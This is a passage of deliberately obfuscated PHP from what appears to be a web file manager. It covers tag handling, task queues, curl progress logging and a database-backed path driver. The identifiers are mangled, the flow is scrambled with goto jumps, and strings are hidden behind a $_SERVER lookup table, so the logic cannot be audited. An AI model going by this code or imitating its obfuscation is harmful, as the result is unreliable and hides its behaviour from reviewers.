array_merge($c—¸ôÅàù³, $bäâ§î ·); foreach ($F«ìàÍ³¬› as $eÄ¸Ãù´) { if (!in_array($eÄ¸Ãù´, $AŒñà‹Î¨ğ)) { $dà‘à˜¹İÓ[] = $eÄ¸Ãù´; } } goto b†±Èº“Ü; F…ƒ¾„â¤¿: } protected function listData($e‹ä©“Ï¨°) { $d‡ë©“—ŠÈ =& $_SERVER[Â€Á›¨õ]; $Còì‚ëÄ˜ = array($d‡ë©“—ŠÈ[1493] => 0, $d‡ë©“—ŠÈ[457] => array($d‡ë©“—ŠÈ[1771], 0), $d‡ë©“—ŠÈ[409] => $d‡ë©“—ŠÈ[1772] . $e‹ä©“Ï¨°); $AÆµ¶ã¿ö² = $d‡ë©“—ŠÈ[1773]; $f÷…×´ºµ = $this->field($AÆµ¶ã¿ö²)->where($Còì‚ëÄ˜)->order($d‡ë©“—ŠÈ[1774])->select(); return $f÷…×´ºµ ? $f÷…×´ºµ : array(); } protected function addToTag($f”‰µÏ»·, $AØ±”øˆĞö, $bàÔŞœ…Ï ) { $c¢§¢Ï‚Ù =& $_SERVER[Â€Á›¨õ]; if (!$this->getByTagID($f”‰µÏ»·, $bàÔŞœ…Ï ) || !$AØ±”øˆĞö) { return !1; } if (!Model($c¢§¢Ï‚Ù[767])->pathInfo($AØ±”øˆĞö)) { return !1; } $f±ì“Úğ‹ = array($c¢§¢Ï‚Ù[1493] => 0, $c¢§¢Ï‚Ù[457] => $bàÔŞœ…Ï , $c¢§¢Ï‚Ù[408] => $AØ±”øˆĞö, $c¢§¢Ï‚Ù[409] => $c¢§¢Ï‚Ù[1775] . $f”‰µÏ»·, $c¢§¢Ï‚Ù[407] => $c¢§¢Ï‚Ù[33], $c¢§¢Ï‚Ù[1668] => 0); if ($this->where($f±ì“Úğ‹)->find()) { return !1; } return $this->add($f±ì“Úğ‹); } protected function removeFromTag($DÖÔ†…Ê¯, $dÍ®“ñ¹Ó, $bì¶ßÅˆ¡) { $A®Â‘µóˆ« =& $_SERVER[Â€Á›¨õ]; if (!$this->getByTagID($DÖÔ†…Ê¯, $bì¶ßÅˆ¡) || !$dÍ®“ñ¹Ó) { return !1; } if (is_array($dÍ®“ñ¹Ó)) { $dÍ®“ñ¹Ó = array($A®Â‘µóˆ«[7], $dÍ®“ñ¹Ó); } $CŞÎÖ¹Í»‰ = array($A®Â‘µóˆ«[1493] => 0, $A®Â‘µóˆ«[457] => $bì¶ßÅˆ¡, $A®Â‘µóˆ«[409] => $A®Â‘µóˆ«[1775] . $DÖÔ†…Ê¯, $A®Â‘µóˆ«[408] => $dÍ®“ñ¹Ó); return $this->where($CŞÎÖ¹Í»‰)->delete(); } protected function removeByTag($AÛôœã×Šœ, $aØí¸İÑ) { $fÒñ÷«œó =& $_SERVER[Â€Á›¨õ]; if (!$this->getByTagID($AÛôœã×Šœ, $aØí¸İÑ)) { return !1; } $bÏ‰›ï½¢¦ = array($fÒñ÷«œó[1493] => 0, $fÒñ÷«œó[457] => $aØí¸İÑ, $fÒñ÷«œó[409] => $fÒñ÷«œó[1775] . $AÛôœã×Šœ); return $this->where($bÏ‰›ï½¢¦)->delete(); } protected function removeBySource($F§ª¹”»Ëª, $E¾´—“ô±ê) { $A™æèñÁ¯À =& $_SERVER[Â€Á›¨õ]; if (!$F§ª¹”»Ëª || !$E¾´—“ô±ê) { return !1; } if (is_array($E¾´—“ô±ê)) { $E¾´—“ô±ê = array($A™æèñÁ¯À[7], $E¾´—“ô±ê); } $Aå‘ÌíÄª„ = array($A™æèñÁ¯À[1493] => 0, $A™æèñÁ¯À[408] => $E¾´—“ô±ê, $A™æèñÁ¯À[457] => array($A™æèñÁ¯À[946], 0), $A™æèñÁ¯À[409] => $A™æèñÁ¯À[1775] . $F§ª¹”»Ëª); return $this->where($Aå‘ÌíÄª„)->delete(); } } goto Bàö¥‰†©î; Fèã£áñ·Ã: class TaskHttp extends Task { protected function startAfter() { $b÷¶–‚‘øí =& $_SERVER[Â€Á›¨õ]; $CµÈ—ë•›µ =& $this->task; $CµÈ—ë•›µ[$b÷¶–‚‘øí[1564]] = 1; Hook::bind($b÷¶–‚‘øí[1536], array($this, $b÷¶–‚‘øí[1565])); Hook::bind($b÷¶–‚‘øí[1538], array($this, $b÷¶–‚‘øí[1566])); Hook::bind($b÷¶–‚‘øí[1540], array($this, $b÷¶–‚‘øí[1567])); } protected function endAfter() { $EÛ×è«‹äá =& $_SERVER[Â€Á›¨õ]; Hook::unbind($EÛ×è«‹äá[1536], array($this, $EÛ×è«‹äá[1565])); Hook::unbind($EÛ×è«‹äá[1538], array($this, $EÛ×è«‹äá[1566])); Hook::unbind($EÛ×è«‹äá[1540], array($this, $EÛ×è«‹äá[1567])); } public function progressStart($d«Êš”Ö‚„) { $eôøŒ–‘©¦ =& $_SERVER[Â€Á›¨õ]; $eÖ¨ÈÁî¯ = curl_getinfo($d«Êš”Ö‚„); self::log($eôøŒ–‘©¦[1568] . $eÖ¨ÈÁî¯[$eôøŒ–‘©¦[303]]); self::valueSet($this->task[$eôøŒ–‘©¦[388]], $this->task); } public function progressEnd($F¥Ÿçš¿) { $c çÂ†ˆéò =& $_SERVER[Â€Á›¨õ]; self::log($c çÂ†ˆéò[1569] . $this->task[$c çÂ†ˆéò[388]]); $this->end(); } public function progress($d³©Ò¬µƒ¬, $d‘àŒ´îå, $B—öÜ•Šö, $DÀ–èÚƒÜ, $E‘Á¯”¶Æ°) { $dÓ“ÒÅè…” =& $_SERVER[Â€Á›¨õ]; $d ½¤ä³×¤ =& $this->task; if ($E‘Á¯”¶Æ° > 0) { $d ½¤ä³×¤[$dÓ“ÒÅè…”[996]] = $d ½¤ä³×¤[$dÓ“ÒÅè…”[996]] == 0 ? $DÀ–èÚƒÜ : $d ½¤ä³×¤[$dÓ“ÒÅè…”[996]]; $d ½¤ä³×¤[$dÓ“ÒÅè…”[1010]] = $E‘Á¯”¶Æ°; } else { if ($B—öÜ•Šö > 0) { $d ½¤ä³×¤[$dÓ“ÒÅè…”[996]] = $d ½¤ä³×¤[$dÓ“ÒÅè…”[996]] == 0 ? $d‘àŒ´îå : $d ½¤ä³×¤[$dÓ“ÒÅè…”[996]]; $d ½¤ä³×¤[$dÓ“ÒÅè…”[1010]] = $B—öÜ•Šö; } } $this->update(); self::log("\x70\x72\157\147\162\145\163\163\x48\x74\x74\160\x3a\144\157\x77\156\72{$B—öÜ•Šö}\57{$d‘àŒ´îå}\x3b\40\165\160\154\157\141\144\x3a{$E‘Á¯”¶Æ°}\x2f{$DÀ–èÚƒÜ}\73"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\163\153\121\165\x65\x75\x65\114\x65\156\x67\164\x68"; const QUEUE_DATA = "\164\x61\163\153\121\x75\x65\x75\145\x44\x61\164\141"; public static $listData = false; public static function initTask() { } public static function add($fö…¥ÂÃÌ, $fìà¾•¬‹ç = array(), $A®«©ÃîéÏ = '', $a’ìØ«Îí = '') { $eÇ‘êŒ‚×­ =& $_SERVER[Â€Á›¨õ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($a’ìØ«Îí && array_find_by_field(self::$listData, $eÇ‘êŒ‚×­[92], $a’ìØ«Îí)) { return !0; } self::$listData[] = array($eÇ‘êŒ‚×­[260] => $fö…¥ÂÃÌ, $eÇ‘êŒ‚×­[1570] => $fìà¾•¬‹ç, $eÇ‘êŒ‚×­[425] => $A®«©ÃîéÏ, $eÇ‘êŒ‚×­[92] => $a’ìØ«Îí); return !0; } public static function addSubmit() { $c¬×·Âª–³ =& $_SERVER[Â€Á›¨õ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($c¬×·Âª–³[1571] . json_encode_force(array_to_keyvalue(self::$listData, $c¬×·Âª–³[33], $c¬×·Âª–³[425])), $c¬×·Âª–³[1572]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($FøÂ¸ŒÒó, $cïš¯ÌÁÇ’ = array(), $a°°î¨¤ö = '', $aŸ…ºšõ˜§ = '') { goto BãÑôöä; Bï¥¡¼£…É: self::setAll($c„ÜªğÁÈƒ); return !0; goto CòÚÚ¼ï¦; Aİ‘çŸ¡‡: if ($aŸ…ºšõ˜§ && array_find_by_field($c„ÜªğÁÈƒ, $cÙ™–‡ˆò†[92], $aŸ…ºšõ˜§)) { return !0; } $c„ÜªğÁÈƒ[] = array($cÙ™–‡ˆò†[260] => $FøÂ¸ŒÒó, $cÙ™–‡ˆò†[1570] => $cïš¯ÌÁÇ’, $cÙ™–‡ˆò†[425] => $a°°î¨¤ö, $cÙ™–‡ˆò†[92] => $aŸ…ºšõ˜§); write_log($cÙ™–‡ˆò†[1571] . $a°°î¨¤ö, $cÙ™–‡ˆò†[1572]); goto Bï¥¡¼£…É; BãÑôöä: $cÙ™–‡ˆò† =& $_SERVER[Â€Á›¨õ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $c„ÜªğÁÈƒ = self::getAll(); goto Aİ‘çŸ¡‡; CòÚÚ¼ï¦: } public static function run() { goto bÂ§Ä„•¶Ô; FªÙ§Ü½ç·: return !0; goto e¦Ë†•ßôğ; Dñ¸Ğï‘: if (!$CØŒ¹Æ—ÁŸ) { return !1; } self::setAll($f¥Àì…„„); $D°ïÇôØµÉ = timeFloat(); goto E‘ÆùÆò·ó; E‘ÆùÆò·ó: try { Hook::apply($CØŒ¹Æ—ÁŸ[$fæå­ÅÆº¨[260]], $CØŒ¹Æ—ÁŸ[$fæå­ÅÆº¨[1570]]); } catch (Exception $D°¸¿Üšæï) { } $Cèôë‡°¥ = number_format(timeFloat() - $D°ïÇôØµÉ, 3) . $fæå­ÅÆº¨[1514]; write_log($fæå­ÅÆº¨[1573] . $CØŒ¹Æ—ÁŸ[$fæå­ÅÆº¨[425]] . $fæå­ÅÆº¨[1574] . $Cèôë‡°¥, $fæå­ÅÆº¨[1572]); goto FªÙ§Ü½ç·; bÂ§Ä„•¶Ô: $fæå­ÅÆº¨ =& $_SERVER[Â€Á›¨õ]; $f¥Àì…„„ = self::getAll(); $CØŒ¹Æ—ÁŸ = array_shift($f¥Àì…„„); goto Dñ¸Ğï‘; e¦Ë†•ßôğ: } public static function count() { $dÎ•Ü¥“‰› = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$dÎ•Ü¥“‰›) { return 0; } return intval($dÎ•Ü¥“‰›); } public static function getAll() { $cåÖ›»¯† = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$cåÖ›»¯†) { return array(); } return $cåÖ›»¯†; } public static function setAll($F¯Ô¸Øªë«) { $CåÇ‹¾Œ‚› = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($F¯Ô¸Øªë«), $CåÇ‹¾Œ‚›); Cache::set(self::QUEUE_DATA, $F¯Ô¸Øªë«, $CåÇ‹¾Œ‚›); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Aƒ£±ĞˆÏŠ, $DàšÒÁ¿Ã = 5.0) { if (!$Aƒ£±ĞˆÏŠ) { return; } $Dà¢Íßˆ–¨ = Cache::get($Aƒ£±ĞˆÏŠ); if (!$Dà¢Íßˆ–¨ || timeFloat() - floatVal($Dà¢Íßˆ–¨) >= $DàšÒÁ¿Ã) { Cache::set($Aƒ£±ĞˆÏŠ, timeFloat(), $DàšÒÁ¿Ã * 10); return !0; } return !1; } public static function timeLimitCall($EÇ‰õ±æÂË, $aêá§½³É’, $B“‡Å©áµ¶, $AºˆàÀ‹óÜ = 5.0) { goto B“²ôôò•¼; CŸ¼ÈçŸİ: Cache::set($Eà‡ßöà“, $d“³¹ÓŒœ¾, 60); Cache::removeMemory($Eà‡ßöà“); write_log($b›‰çŞ«”‡[1578] . $EÇ‰õ±æÂË . $b›‰çŞ«”‡[67] . $aêá§½³É’, $b›‰çŞ«”‡[1572]); goto fÏ¦ë¸ÁŒ¿; A²ââ‹Íà‹: $Eà‡ßöà“ = $b›‰çŞ«”‡[1575]; $d“³¹ÓŒœ¾ = Cache::get($Eà‡ßöà“, !0); $D©¨‡¼•¨Ğ = array($b›‰çŞ«”‡[1576] => timeFloat(), $b›‰çŞ«”‡[1577] => timeFloat(), $b›‰çŞ«”‡[260] => $aêá§½³É’, $b›‰çŞ«”‡[1570] => $B“‡Å©áµ¶, $b›‰çŞ«”‡[195] => $AºˆàÀ‹óÜ); goto cá…³×ø¥; cá…³×ø¥: if (is_array($d“³¹ÓŒœ¾[$EÇ‰õ±æÂË])) { $D©¨‡¼•¨Ğ[$b›‰çŞ«”‡[1577]] = $d“³¹ÓŒœ¾[$EÇ‰õ±æÂË][$b›‰çŞ«”‡[1577]]; } if (is_array($d“³¹ÓŒœ¾[$EÇ‰õ±æÂË])) { if (timeFloat() - $d“³¹ÓŒœ¾[$EÇ‰õ±æÂË][$b›‰çŞ«”‡[1576]] < $D©¨‡¼•¨Ğ[$b›‰çŞ«”‡[195]] * 0.3) { return; } $D©¨‡¼•¨Ğ[$b›‰çŞ«”‡[1577]] = $d“³¹ÓŒœ¾[$EÇ‰õ±æÂË][$b›‰çŞ«”‡[1577]]; } $d“³¹ÓŒœ¾[$EÇ‰õ±æÂË] = $D©¨‡¼•¨Ğ; goto CŸ¼ÈçŸİ; B“²ôôò•¼: $b›‰çŞ«”‡ =& $_SERVER[Â€Á›¨õ]; if (!$EÇ‰õ±æÂË || !$aêá§½³É’) { return; } self::$asyncAdd = !0; goto A²ââ‹Íà‹; fÏ¦ë¸ÁŒ¿: } public static function timeLimitCallLoop() { goto Fß³½Ü“„; C‘¥àçí¨Ÿ: if (!$Fß‚ä‰Á‡¦ && !self::$asyncAdd) { return; } $Bßø…«ô¤ = $aœµÇÍ [1575]; $DÖ×õò°‘õ = Cache::get($Bßø…«ô¤, !0); goto EˆŸ –àğ; Eø¾¡·ßĞ: if (!$B¼¯å‘–‹) { return Cache::remove($Bßø…«ô¤); } Cache::set($Bßø…«ô¤, $B¼¯å‘–‹, 60); Cache::removeMemory($Bßø…«ô¤); goto b«ÈÊ©ï; EˆŸ –àğ: if (!$DÖ×õò°‘õ || count($DÖ×õò°‘õ) <= 0) { return; } $AÈì„§ßª = !1; $côÛæî¹â‰ = timeFloat(); goto eòš¶È‘†”; Fß³½Ü“„: $aœµÇÍ  =& $_SERVER[Â€Á›¨õ]; $Dó¼šùã¦Ö = array($aœµÇÍ [1579]); $Fß‚ä‰Á‡¦ = in_array(strtolower(ACTION), $Dó¼šùã¦Ö); goto C‘¥àçí¨Ÿ; eòš¶È‘†”: $B¼¯å‘–‹ = array(); foreach ($DÖ×õò°‘õ as $DÔ—ó˜îéˆ => $féŒ–¥Û®Ä) { if ($côÛæî¹â‰ - $féŒ–¥Û®Ä[$aœµÇÍ [1577]] > $féŒ–¥Û®Ä[$aœµÇÍ [195]]) { $AÈì„§ßª = !0; try { Hook::apply($féŒ–¥Û®Ä[$aœµÇÍ [260]], $féŒ–¥Û®Ä[$aœµÇÍ [1570]]); write_log($aœµÇÍ [1580] . $DÔ—ó˜îéˆ . $aœµÇÍ [67] . $féŒ–¥Û®Ä[$aœµÇÍ [260]] . $aœµÇÍ [1581] . ACTION, $aœµÇÍ [1572]); } catch (Exception $Dœ¥ÏëÑ”) { } continue; } $B¼¯å‘–‹[$DÔ—ó˜îéˆ] = $féŒ–¥Û®Ä; } if (!$AÈì„§ßª) { return; } goto Eø¾¡·ßĞ; b«ÈÊ©ï: } public static function finished($a‹ŠÈÆåÀ, $D¸º·©èÛ¸) { $D”šªÉ­‚¦ =& $_SERVER[Â€Á›¨õ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($D”šªÉ­‚¦[260] => $a‹ŠÈÆåÀ, $D”šªÉ­‚¦[1570] => $D¸º·©èÛ¸); } private static function finishedRun() { $C‡öêŠÚî° =& $_SERVER[Â€Á›¨õ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $bñô—Ô¡Ì) { try { Hook::apply($bñô—Ô¡Ì[$C‡öêŠÚî°[260]], $bñô—Ô¡Ì[$C‡öêŠÚî°[1570]]); } catch (Exception $b…Ô˜›âæí) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto b¶ÓÈã‰‚; BÑñ–ÎÙŠ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($cÒš‹„âÊ) { $this->pathParse = $cÒš‹„âÊ; $this->model = Model($_SERVER[Â€Á›¨õ][1178]); } public function getPath($EƒˆÈßÕ°Ä) { return trim($EƒˆÈßÕ°Ä, $_SERVER[Â€Á›¨õ][8]); } public function pathFather($EëŠ›¼ŸÎÑ) { $A–…šÓ†ÏÎ = $this->parse($EëŠ›¼ŸÎÑ); $A–…šÓ†ÏÎ = $this->infoSimple($EëŠ›¼ŸÎÑ); return $A–…šÓ†ÏÎ ? $A–…šÓ†ÏÎ[$_SERVER[Â€Á›¨õ][472]] : !1; } public function pathThis($bª«¦§††) { $Bô´¨ÌŒÛ¦ = $this->infoSimple($bª«¦§††); return $Bô´¨ÌŒÛ¦ ? $Bô´¨ÌŒÛ¦[$_SERVER[Â€Á›¨õ][28]] : !1; } public function getPathOuter($AïÙËÊÒ·ë) { if (!$AïÙËÊÒ·ë) { return $AïÙËÊÒ·ë; } $e®ğ™ğ‡¹‡ = $this->parse($AïÙËÊÒ·ë); return KodIO::make($e®ğ™ğ‡¹‡[$_SERVER[Â€Á›¨õ][388]]); } public function copyFolderFromIO($bÂÎ²Î–÷‡, $fÜÕ‰´©Û–, $Eã¿Š§µâë, $FÊ‹÷œÃËë, $bš…®Ş) { $bÛ¼¥êÎ˜ = $this->model->copyFolderFromIO($bÂÎ²Î–÷‡, $fÜÕ‰´©Û–, $Eã¿Š§µâë, $FÊ‹÷œÃËë, $bš…®Ş); return KodIO::make($bÛ¼¥êÎ˜); } public function isParentOf($BÏ÷Ñ¬´š, $b¹³ÊáŠ¸ô) { return $this->model->isParentOf($BÏ÷Ñ¬´š, $b¹³ÊáŠ¸ô); } public function mkfile($CÔŞ¯ƒä´™, $eìĞâ¤ˆÃñ = '', $aò†ë¨‚µ‰ = REPEAT_RENAME) { $cö¢§Æ†‚Š =& $_SERVER[Â€Á›¨õ]; $A•ò™ÂÔº± = $this->parse($CÔŞ¯ƒä´™); $CÔŞ¯ƒä´™ = $A•ò™ÂÔº±[$cö¢§Æ†‚Š[388]]; for ($b¾î§†´é = 0; $b¾î§†´é < count($A•ò™ÂÔº±[$cö¢§Æ†‚Š[1179]]); $b¾î§†´é++) { $Dá‘›„š¶Ğ = $A•ò™ÂÔº±[$cö¢§Æ†‚Š[1179]][$b¾î§†´é]; if ($b¾î§†´é == count($A•ò™ÂÔº±[$cö¢§Æ†‚Š[1179]]) - 1) { $CÔŞ¯ƒä´™ = $this->model->mkfile($CÔŞ¯ƒä´™, $Dá‘›„š¶Ğ, $eìĞâ¤ˆÃñ, $aò†ë¨‚µ‰); break; } $CÔŞ¯ƒä´™ = $this->model->mkdir($CÔŞ¯ƒä´™, $Dá‘›„š¶Ğ, REPEAT_SKIP); } return $this->getPathOuter($CÔŞ¯ƒä´™); } public function mkdir($Aó¶Ê‰ÂÃô, $fßª¡ÕÂ¢ì = REPEAT_SKIP) { $AŠÓñÄ‘…Ÿ =& $_SERVER[Â€Á›¨õ]; $aä‡Î–ç¤Ö = $this->parse($Aó¶Ê‰ÂÃô); $Aó¶Ê‰ÂÃô = $aä‡Î–ç¤Ö[$AŠÓñÄ‘…Ÿ[388]]; for ($f††¾òÇä¾ = 0; $f††¾òÇä¾ < count($aä‡Î–ç¤Ö[$AŠÓñÄ‘…Ÿ[1179]]); $f††¾òÇä¾++) { $CŸÍé¾Ç‹• = $aä‡Î–ç¤Ö[$AŠÓñÄ‘…Ÿ[1179]][$f††¾òÇä¾]; $Aó¶Ê‰ÂÃô = $this->model->mkdir($Aó¶Ê‰ÂÃô, $CŸÍé¾Ç‹•, $fßª¡ÕÂ¢ì); } return $this->getPathOuter($Aó¶Ê‰ÂÃô); } public function copyFile($aÍ¨¥á‹Äó, $E†ÀÇµ¦œÛ, $DğĞ¼²ÏÚ = REPEAT_REPLACE) { $A®ğíÂŒÊÜ =& $_SERVER[Â€Á›¨õ]; $däœŸÒ¾Ú = $this->parse($E†ÀÇµ¦œÛ); $EÊŞÎ™ Û  = $this->model->copy($aÍ¨¥á‹Äó, $däœŸÒ¾Ú[$A®ğíÂŒÊÜ[388]], $DğĞ¼²ÏÚ, $däœŸÒ¾Ú[$A®ğíÂŒÊÜ[75]]); return $EÊŞÎ™ Û  ? $this->getPathOuter($EÊŞÎ™ Û ) : !1; } public function moveFile($fÒ¢¯Á¶³, $B¿ä¿•ë˜É, $C³ğ¾¯Ñ = REPEAT_REPLACE) { $FÄ–âÎ Á =& $_SERVER[Â€Á›¨õ]; $CÁÚÎ®È´ì = $this->parse($B¿ä¿•ë˜É); $Cæ¬¾ÆÍ = $this->model->move($fÒ¢¯Á¶³, $CÁÚÎ®È´ì[$FÄ–âÎ Á[388]], $C³ğ¾¯Ñ, $CÁÚÎ®È´ì[$FÄ–âÎ Á[75]]); return $Cæ¬¾ÆÍ ? $this->getPathOuter($Cæ¬¾ÆÍ) : !1; } public function copy($CùŞ¾‹ó¡‰, $FÌŞ¢ùïÀ”, $cÒ¹©²Ê‡ = REPEAT_REPLACE) { $d¢­¯Ôİó = $this->parse($FÌŞ¢ùïÀ”); $e×ğ“èÅÊ… = $this->model->copy($CùŞ¾‹ó¡‰, $d¢­¯Ôİó[$_SERVER[Â€Á›¨õ][388]], $cÒ¹©²Ê‡); return $e×ğ“èÅÊ… ? $this->getPathOuter($e×ğ“èÅÊ…) : !1; } public function moveSameAllow() { } public function move($C´Úá„“, $eèí›É²¥¿, $d¢ ÉçŠÓÀ = REPEAT_REPLACE) { $CÒÆßÂ×ø… = $this->parse($eèí›É²¥¿); $a»Ö…Í‹·Ö = $this->model->move($C´Úá„“, $CÒÆßÂ×ø…[$_SERVER[Â€Á›¨õ][388]], $d¢ ÉçŠÓÀ); return $a»Ö…Í‹·Ö ? $this->getPathOuter($a»Ö…Í‹·Ö) : !1; } public function remove($EÁ­²ÍÊ¼“, $dÏ²¿Ç‘– = true) { return $this->model->remove($EÁ­²ÍÊ¼“, $dÏ²¿Ç‘–); } public function rename($e†‹Œ”Æã, $cåõÑ®¦æ˜) { $bÔß…÷øñä = $this->model->rename($e†‹Œ”Æã, $cåõÑ®¦æ˜); return $bÔß…÷øñä ? $this->getPathOuter($e†‹Œ”Æã) : $bÔß…÷øñä; } public function size($F¿“Ü¶›®) { $EŠ·ßê÷ƒñ = $this->infoSimple($F¿“Ü¶›®); return $EŠ·ßê÷ƒñ ? $EŠ·ßê÷ƒñ[$_SERVER[Â€Á›¨õ][77]] : 0; } public function infoSimple($Bª˜õñ¥Ó) { return $this->model->sourceInfo($Bª˜õñ¥Ó); } public function info($E½ŠğÂ‡’‚) { return $this->infoParse($E½ŠğÂ‡’‚); } public function infoAuth($f«ß¸›ÁêÊ) { return $this->infoParse($f«ß¸›ÁêÊ, !1, !0); } public function infoWithChildren($a×£ÃÖõÔñ) { return $this->infoParse($a×£ÃÖõÔñ, !0); } protected function infoParse($e• ïÓë, $Côœ™Œ‚„ë = false, $Eì›œÌÉå½ = false) { if (!$Côœ™Œ‚„ë) { return $this->model->pathInfo($e• ïÓë, $Eì›œÌÉå½); } return $this->model->pathInfoMore($e• ïÓë); } public function infoFull($eîˆÀ“Š¼ó) { $fğéóºÉ =& $_SERVER[Â€Á›¨õ]; $bÔä×ô«è² = explode($fğéóºÉ[8], $eîˆÀ“Š¼ó); $AØí—ìöÉã = implode($fğéóºÉ[8], array_splice($bÔä×ô«è², 1)); return $this->model->pathInfoByPath($bÔä×ô«è²[0], $AØí—ìöÉã); } public function hashSimple($A¥µ‡¨ÎÀ) { $Fö´‰±˜à  =& $_SERVER[Â€Á›¨õ]; $a¢Å—ƒòŸ = $this->infoWithChildren($A¥µ‡¨ÎÀ); return $a¢Å—ƒòŸ[$Fö´‰±˜à [163]][$Fö´‰±˜à [170]]; } public function hashMd5($DËî±â¿Ï®) { $døÊÃ¾¶é =& $_SERVER[Â€Á›¨õ]; $e È•¨»ê = $this->infoWithChildren($DËî±â¿Ï®); return $e È•¨»ê[$døÊÃ¾¶é[163]][$døÊÃ¾¶é[169]]; } public function exist($e¯ì˜¡Ëã) { $fĞ‘òÉé¦× =& $_SERVER[Â€Á›¨õ]; $cç’šŸœµ = $this->parse($e¯ì˜¡Ëã); if (!$cç’šŸœµ[$fĞ‘òÉé¦×[75]]) { return $this->isFile($e¯ì˜¡Ëã) || $this->isFolder($e¯ì˜¡Ëã); } $dùøŸÆÃ©– = array($fĞ‘òÉé¦×[389] => $cç’šŸœµ[$fĞ‘òÉé¦×[388]], $fĞ‘òÉé¦×[28] => $cç’šŸœµ[$fĞ‘òÉé¦×[75]]); $fõäåª¢ = $this->model->where($dùøŸÆÃ©–)->find(); return $fõäåª¢ ? !0 : !1; } public function isFile($b·ŸØ®ÔÖñ) { $eáïİø†„ =& $_SERVER[Â€Á›¨õ]; $a‹ƒĞ‰ÙÏ“ = $this->infoSimple($b·ŸØ®ÔÖñ); return $a‹ƒĞ‰ÙÏ“ && $a‹ƒĞ‰ÙÏ“[$eáïİø†„[397]] == $eáïİø†„[86] ? !1 : !0; } public function isFolder($Cßêö‹Óµ«) { $c‚ë„¤‘Œ¯ =& $_SERVER[Â€Á›¨õ]; $C•†Ã£ˆ­ = $this->infoSimple($Cßêö‹Óµ«); return $C•†Ã£ˆ­ && $C•†Ã£ˆ­[$c‚ë„¤‘Œ¯[397]] == $c‚ë„¤‘Œ¯[86] ? !0 : !1; } public function listPath($FŸ¶›¹¨ø, $F©–Áµ¹‡ = false) { $CªÔšåçˆâ =& $_SERVER[Â€Á›¨õ]; if ($FŸ¶›¹¨ø == $CªÔšåçˆâ[33]) { return !1; } $bÈòë½â“µ = array($CªÔšåçˆâ[389] => $FŸ¶›¹¨ø); if ($F©–Áµ¹‡) { return $this->model->listSource($bÈòë½â“µ, -1); } return $this->model->listSource($bÈòë½â“µ); } public function has($EÈ¾ğÍÛŒä, $Dâë‹¢˜İÏ = false, $E’„Ôìİ² = null) { $BÀíÉ´ëŠ =& $_SERVER[Â€Á›¨õ]; $cÖ…‰ÅÎ’ = $this->infoWithChildren($EÈ¾ğÍÛŒä); if ($Dâë‹¢˜İÏ) { return array($BÀíÉ´ëŠ[202] => $cÖ…‰ÅÎ’[$BÀíÉ´ëŠ[202]], $BÀíÉ´ëŠ[201] => $cÖ…‰ÅÎ’[$BÀíÉ´ëŠ[201]]); } return $E’„Ôìİ² ? $cÖ…‰ÅÎ’[$BÀíÉ´ëŠ[202]] : $cÖ…‰ÅÎ’[$BÀíÉ´ëŠ[201]]; } public function listAll($B¿¸à‚Ãƒ) { $BÆœÎŒ¶ñ² = IO::info($this->pathParse[$_SERVER[Â€Á›¨õ][75]]); if (!$BÆœÎŒ¶ñ²) { return array(); } return $this->model->listAll($B¿¸à‚Ãƒ); } public function getContent($FÈŠó‹ë¸ˆ) { return $this->model->getContent($FÈŠó‹ë¸ˆ); } public function setContent($dŠÉİ‚ìÎ, $fç·Ì…ÂÈ = '') { return $this->model->setContent($dŠÉİ‚ìÎ, $fç·Ì…ÂÈ); } public function fileSubstr($d¿ë‡ÃÀ‘Æ, $AĞ†…ÀÓ , $cÎº¶óîÇ˜) { return $this->model->fileSubstr($d¿ë‡ÃÀ‘Æ, $AĞ†…ÀÓ , $cÎº¶óîÇ˜); } public function download($bÖª‡‡×õ¡, $DÜçóÛ¤“¦ = '') { $Cé†íë¿½ï = get_path_father($DÜçóÛ¤“¦); $c‚Í¯ôÊâÇ = get_path_this($DÜçóÛ¤“¦); $dµÅ®ÊÄˆº = $this->model->fileInfoGet($bÖª‡‡×õ¡); $Eğ„ˆ—Œ¢ù = IO::copy($dµÅ®ÊÄˆº[$_SERVER[Â€Á›¨õ][75]], $Cé†íë¿½ï, !1, $c‚Í¯ôÊâÇ); return $Eğ„ˆ—Œ¢ù; } public function setModifyTime($f´‚Ã˜‚†Ö, $Aõ„Î³Ğ±Ç = '') { $this->model->metaSet($f´‚Ã˜‚†Ö, $_SERVER[Â€Á›¨õ][1180], $Aõ„Î³Ğ±Ç); } public function upload($FÆƒïÙ¼¬­, $DƒíË…÷å±, $AØ†ŞöçÀæ = false, $DçÛÛ­Ê‡ = REPEAT_REPLACE) { $AÂ‘œòÃ÷§ =& $_SERVER[Â€Á›¨õ]; $f‡†İÃÓ œ = $this->parse($FÆƒïÙ¼¬­); $eÏİˆµÃÕâ = $this->model->addFile($f‡†İÃÓ œ[$AÂ‘œòÃ÷§[388]], $DƒíË…÷å±, $f‡†İÃÓ œ[$AÂ‘œòÃ÷§[75]], $AØ†ŞöçÀæ, $DçÛÛ­Ê‡); return $this->getPathOuter($eÏİˆµÃÕâ); } public function uploadFileByID($FùÀÙ‚Â‰, $F‰ğŞ‘ñ•£, $a´ê‹‹Š–) { $bÛ†˜Èœ™ =& $_SERVER[Â€Á›¨õ]; $bë¯š¿êÏÌ = $this->parse($FùÀÙ‚Â‰); $FÀ—Ë³Üµ = $this->model->addFileByFileID($bë¯š¿êÏÌ[$bÛ†˜Èœ™[388]], $F‰ğŞ‘ñ•£, $bë¯š¿êÏÌ[$bÛ†˜Èœ™[75]], $a´ê‹‹Š–); return $this->getPathOuter($FÀ—Ë³Üµ); } public function addFileByRemote($aªñ·¡³ÍÜ, 